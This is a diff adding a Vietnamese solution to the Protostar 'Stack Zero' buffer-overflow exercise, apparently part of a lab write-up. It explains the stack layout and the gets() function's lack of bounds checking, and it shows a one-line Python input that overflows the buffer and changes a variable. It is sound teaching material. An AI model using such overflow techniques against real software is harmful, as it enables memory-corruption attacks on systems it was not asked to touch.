@@ -31,4 +31,45 @@ int main(int argc, char **argv)
 
 ## Solutions
 
+Ta có cấu trúc của stack memory sẽ nhìn như này:
+
+```
+     high memory adddress
+  | |====================| 
+  | |   name-parameter   |  ^
+  | |====================|  | buffer
+  S |   return address   |  | fill
+  T |====================|  | direction
+  A |  base-pointer|'''''|  |
+  C |==============|'''''|  |
+  K |''''''''''''''''''''|  |
+  | |'''''''buffer'''''''|  |
+  | |''''''''''''''''''''|  |
+  | |====================|  |
+  | |                    |  |
+  | |....................|
+      low memory address
+```
+
+Biến `modified` được khai báo `volatile int` và gán giá trị bằng 1 sau đó có mảng `buffer` gồm 64 ký tự. `Buffer` lấy giá trị từ hàm nhập gets().
+
+Đây là hướng dẫn về hàm gets của Linux `$ man gets`
+
+```man
+DESCRIPTION
+       Never use this function.
+
+       gets() reads a line from stdin into the buffer pointed to by s until ei‐
+       ther a terminating newline or EOF, which it replaces with  a  null  byte
+       ('\0').  No check for buffer overrun is performed (see BUGS below).
+```
+
+Ngay đầu mô tả ta đã thấy không bao giờ nên sử dụng hàm này vì gets nhận 1 dòng ký tự từ stdin cho đến khi gặp ký tự newline thì thay thế newline = NULL byte ('\0') và đặc biệt hàm không kiểm tra số ký tự được nhập vào -> gây ra buffer overflow.
+
+`Stack Zero` yêu cầu chúng ta thay đổi giá trị mặc định của biến `modified` != `0`. Ta sẽ nhập nhiều hơn 64 ký tự của `buffer` với gets để ghi đè lên biến `modified` theo như bố cục trên STACK.
+
+```
+root@protostar:/opt/protostar/bin# python -c 'print "A" * 65' | ./stack0
+you have changed the 'modified' variable
+```
 
